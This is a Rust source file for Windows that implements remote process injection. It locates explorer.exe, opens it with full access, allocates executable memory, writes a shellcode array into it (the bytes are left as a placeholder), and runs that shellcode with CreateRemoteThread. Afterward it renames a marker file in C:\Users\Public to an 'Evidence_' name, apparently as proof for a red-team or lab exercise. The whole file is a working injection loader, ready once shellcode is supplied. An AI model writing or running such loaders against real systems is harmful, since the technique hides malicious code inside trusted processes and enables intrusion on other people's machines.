use std::mem::transmute;
use std::path::Path;
use std::ptr;
use std::thread::sleep;
use winapi::shared::minwindef::{DWORD, FALSE};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess};
use winapi::um::winnt::{MEM_COMMIT, PROCESS_ALL_ACCESS};
use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, 
    PROCESSENTRY32, Process32First, Process32Next};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use std::ptr::null_mut;
use winapi::um::winbase::FormatMessageW;
use winapi::um::winnt::MAKELANGID;
use winapi::um::winnt::LANG_NEUTRAL;
use winapi::um::winnt::SUBLANG_DEFAULT;
use winapi::um::winbase::FORMAT_MESSAGE_FROM_SYSTEM;
use winapi::um::winbase::FORMAT_MESSAGE_IGNORE_INSERTS;
use std::ffi::CString;
use std::fs;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

fn main() {
    let shellcode: [u8;2006] = [SHELL_CODE_HERE];

    let process_name = "explorer.exe";
    let pid = getProcessID(process_name);
    if(pid==0){
        println!("Can not find {} process. Exiting", process_name);
        return;
    }
    //println!("Found {} at ")
    //let ALL_ACCESS = 0x001FFFFF;
    unsafe{
        let handle = OpenProcess(PROCESS_ALL_ACCESS, 0 as i32, pid);
        
        print_msg(format!("Handle of the {} process {:?}", process_name, handle).as_str());

        let base_ptr = VirtualAllocEx(handle, ptr::null_mut(), shellcode.len(), MEM_COMMIT, 0x40);
        
        print_msg(format!("Allocated memory in {} process at {:?}", process_name, base_ptr).as_str());

        let writtenBytes:usize = 0;
        WriteProcessMemory(handle, base_ptr, shellcode.as_ptr() as *const winapi::ctypes::c_void, shellcode.len(), 0 as *mut usize);

        //if(writtenBytes)
        print_msg(format!("Wrote shellcode to {} process", process_name).as_str());

        let thread_id:u32 = 0;
        let thread_handle = CreateRemoteThread(handle, ptr::null_mut(), 0, Some(transmute(base_ptr)), ptr::null_mut(), 0, 0 as *mut u32);

        print_msg(format!("Thread Handle: {:?}", thread_handle).as_str());

        rename_file("C:\\Users\\Public\\t.txt");

    }
}

fn getProcessID(processName: &str) -> u32{
    let mut pid: u32 = 0;
    let mut pe32: PROCESSENTRY32;
    let snapshot = unsafe { CreateToolhelp32Snapshot(winapi::um::tlhelp32::TH32CS_SNAPPROCESS, 0) };
    if snapshot == ptr::null_mut() {
        print_msg("CreateToolhelp32Snapshot Error");
        return pid;
        
    }

    print_msg("Snapshot created");
    unsafe{
        pe32 = std::mem::zeroed();
        pe32.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
        
        if Process32First(snapshot, &mut pe32) == FALSE {
            print_msg("Process32First");
        CloseHandle(snapshot);
        return pid;
    }
    
    loop {
        //print_msg("\n\n=====================================================");
        let proc = std::ffi::CStr::from_ptr(pe32.szExeFile.as_ptr()).to_str().unwrap();
        let proc_id = pe32.th32ProcessID;
        // print_msg("{} -> {}", proc_id, proc);
        if (proc == processName){
            print_msg(format!("Found {} process with {} ID", proc, proc_id).as_str());
            return proc_id;
        }

        if Process32Next(snapshot, &mut pe32) == FALSE {
                return pid;
            }        
    }
    }
}

fn print_msg(msg: &str) {
    unsafe {
        let e_num = GetLastError();
        let mut sys_msg: [u16; 256] = [0; 256];
        FormatMessageW(
            FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            null_mut(),
            e_num,
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT) as DWORD,
            sys_msg.as_mut_ptr(),
            sys_msg.len() as DWORD,
            null_mut(),
        );

        let msg = CString::new(msg).unwrap();
        let sys_msg = String::from_utf16_lossy(&sys_msg);
        println!("{}. {}", msg.to_str().unwrap(), sys_msg);

        if(e_num > 0){
            println!("\n...............Exiting.............");
            std::process::exit(1);
        }
    }
}

fn get_current_timestamp() -> String {
    let now = SystemTime::now();
    let since_epoch = now.duration_since(UNIX_EPOCH).expect("Time went backwards");
    let timestamp = since_epoch.as_secs();

    // Format the timestamp as desired (e.g., YYYYMMDDHHMMSS)
    format!("{:010}", timestamp)
}

fn rename_file(filePath: &str) -> bool{
    sleep(Duration::from_secs(5));
    let path = Path::new(filePath);
    if !path.exists() {
        println!("The file does not exist.");
        return false;
    }
    let original_filename = filePath;
    let timestamp = get_current_timestamp();

    let temp: Vec<&str> = original_filename.split("t.txt").collect();
    let new_filename = format!("{}Evidence_{}.txt", temp[0], timestamp);

    let res = fs::rename(original_filename, new_filename.clone());
    match res {
        Ok(msg) => {
            println!("File renamed to {}", new_filename);
            return true;
        },
        Err(msg) => {
            println!("Error renaming the file");
            return false;
        }
    }
}

    // fn proceEnum(procName: &str) {
        //     let mut process_ids = vec![0u32; 1024];
//     let mut bytes_returned = 0u32;

//     unsafe {
//         if EnumProcesses(
//             process_ids.as_mut_ptr(),
//             (process_ids.len() * size_of::<u32>()) as u32,
//             &mut bytes_returned,
//         ) == 0
//         {
//             eprint_msg("Failed to enumerate processes");
//             return;
//         }

//         let num_processes = bytes_returned as usize / size_of::<u32>();
//         process_ids.truncate(num_processes);

//         for process_id in &process_ids {
//             if *process_id != 0 {
//                 print_msg("Process ID: {}", process_id);

//                 let handle = OpenProcess(PROCESS_QUERY_INFORMATION, 0, *process_id);
//                 if !handle.is_null() {
//                     // Perform additional operations on the process handle here if needed

//                     CloseHandle(handle);
//                 }
//             }
//         }
//     }
// }